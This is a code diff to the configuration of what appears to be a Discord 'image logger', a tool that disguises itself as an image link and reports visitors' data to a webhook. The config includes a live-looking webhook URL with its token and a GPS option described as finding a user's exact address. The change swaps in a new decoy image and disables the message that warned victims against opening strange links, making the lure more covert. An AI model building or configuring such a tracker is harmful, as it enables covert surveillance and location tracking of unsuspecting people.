@@ -10,7 +10,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1464978890261794902/Cvag0LqpXeXMthPUJ0PdJjIbp1OFIWCCRa_waFc3Mk7svDYLyzNvJ9VsjeShwbfzQZ73",
-    "image": "https://cdn.discordapp.com/attachments/1464978181659295867/1465610892275355660/9FB03BE3-63B9-438F-8898-AC83C5BFF260.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://i.postimg.cc/RZhvD90W/IMG-1982.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -24,8 +24,8 @@ config = {
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": True, # Enable the custom message?
-        "message": "Oeffne in Zukunft keine Fremden Links ^^", # Message to show
+        "doMessage": False, # Enable the custom message?
+        "message": "", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
